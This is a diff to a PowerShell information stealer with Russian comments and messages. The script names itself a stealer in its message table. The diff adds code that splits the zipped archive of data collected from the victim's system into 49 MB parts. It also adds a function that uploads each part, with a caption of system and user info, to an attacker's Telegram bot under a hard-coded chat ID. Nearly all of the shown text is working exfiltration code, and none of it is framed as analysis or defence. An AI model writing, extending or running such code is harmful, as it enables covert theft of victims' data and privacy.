@@ -1,4 +1,4 @@
-# --- Настраиваемый блок для текста сообщений ---
+# --- Настраиваемый блок для текстов сообщений ---
 $messages = @{
     Start = "Запуск стиллера...";
     SystemCollect = "Сбор информации о системе";
@@ -23,6 +23,90 @@ $ChatID = "1266539824"
 function WriteMsg($key) {
     Write-Host $messages[$key]
 }
+
+# --- Разделение файла на части ---
+function Split-File {
+    param (
+        [string]$FilePath,
+        [int]$PartSizeMB = 49
+    )
+    $bufSize = 1MB
+    $maxBytes = $PartSizeMB * 1MB
+    $filename = [System.IO.Path]::GetFileNameWithoutExtension($FilePath)
+    $ext = [System.IO.Path]::GetExtension($FilePath)
+    $dir = [System.IO.Path]::GetDirectoryName($FilePath)
+    $parts = @()
+    $f = [System.IO.File]::OpenRead($FilePath)
+    try {
+        $partIdx = 1
+        while ($f.Position -lt $f.Length) {
+            $partName = "$dir\$filename.part$partIdx$ext"
+            $out = [System.IO.File]::Create($partName)
+            $written = 0
+            $buf = New-Object byte[] $bufSize
+            while ($written -lt $maxBytes -and $f.Position -lt $f.Length) {
+                $toRead = [Math]::Min($bufSize, $maxBytes - $written)
+                $r = $f.Read($buf, 0, $toRead)
+                if ($r -gt 0) {
+                    $out.Write($buf, 0, $r)
+                    $written += $r
+                }
+                else { break }
+            }
+            $out.Close()
+            $parts += $partName
+            $partIdx++
+        }
+    } finally {
+        $f.Close()
+    }
+    return $parts
+}
+
+function Send-ResultToTelegram {
+    param (
+        [string]$BotToken,
+        [string]$ChatID,
+        [string]$ZipPath,
+        [string]$SystemInfoPath
+    )
+    $caption = Get-Content $SystemInfoPath | Out-String
+    $url = "https://api.telegram.org/bot$BotToken/sendDocument"
+    try {
+        Add-Type -AssemblyName System.Net.Http
+        $fileStream = [System.IO.File]::OpenRead($ZipPath)
+        $fileName = [System.IO.Path]::GetFileName($ZipPath)
+        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
+        $form = New-Object System.Net.Http.MultipartFormDataContent
+        $form.Add($fileContent, "document", $fileName)
+        $form.Add((New-Object System.Net.Http.StringContent($ChatID)), "chat_id")
+        $form.Add((New-Object System.Net.Http.StringContent($caption)), "caption")
+        $client = New-Object System.Net.Http.HttpClient
+        $response = $client.PostAsync($url, $form).Result
+        $statusCode = $response.StatusCode
+        $reasonPhrase = $response.ReasonPhrase
+        $result = $response.Content.ReadAsStringAsync().Result
+        Write-Host "DEBUG: StatusCode -> $statusCode"
+        Write-Host "DEBUG: ReasonPhrase -> $reasonPhrase"
+        Write-Host "DEBUG: Response -> $result"
+        $fileStream.Dispose()
+        $form.Dispose()
+        $client.Dispose()
+        if ($response.StatusCode -eq [System.Net.HttpStatusCode]::OK) { 
+            Write-Host "DEBUG: Файл успешно отправлен!"
+            return $true 
+        } else { 
+            Write-Host "DEBUG: Ошибка при отправке файла."
+            return $false 
+        }
+    }
+    catch {
+        Write-Host "DEBUG: Exception! " $_.Exception.Message
+        return $false
+    }
+}
+
 function Start-Execution {
     WriteMsg "Start"
     $tempDir = "$env:TEMP\SystemData-$(Get-Random)"
@@ -48,12 +132,24 @@ function Start-Execution {
     $zipPath = "$env:TEMP\DataPackage-$(Get-Random).zip"
     Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
 
+    # Теперь анализируем размер архива
+    $maxTelegramMB = 49
+    $zipSizeMB = [Math]::Round((Get-Item $zipPath).Length / 1MB,2)
+    Write-Host "DEBUG: Размер архива $zipSizeMB МБ"
     WriteMsg "TelegramSend"
-    $ok = Send-ResultToTelegram -BotToken $BotToken -ChatID $ChatID -ZipPath $zipPath -SystemInfoPath "$tempDir\System\user_info.txt"
-    if ($ok) {
-        WriteMsg "Success"
+    if ($zipSizeMB -le $maxTelegramMB) {
+        $ok = Send-ResultToTelegram $BotToken $ChatID $zipPath "$tempDir\System\user_info.txt"
+        if ($ok) { WriteMsg "Success" } else { WriteMsg "FailSend" }
     } else {
-        WriteMsg "FailSend"
+        Write-Host "DEBUG: Архив слишком большой! Разбиваем на части..."
+        $parts = Split-File -FilePath $zipPath -PartSizeMB $maxTelegramMB
+        $allOk = $true
+        foreach ($pt in $parts) {
+            $captionPart = "$([System.IO.Path]::GetFileName($pt)) ($zipSizeMB МБ исходный архив)"
+            $ok = Send-ResultToTelegram $BotToken $ChatID $pt "$tempDir\System\user_info.txt"
+            if (-not $ok) { $allOk = $false }
+        }
+        if ($allOk) { WriteMsg "Success" } else { WriteMsg "FailSend" }
     }
 
     Remove-Item -Path $tempDir -Recurse -Force -Confirm:$false
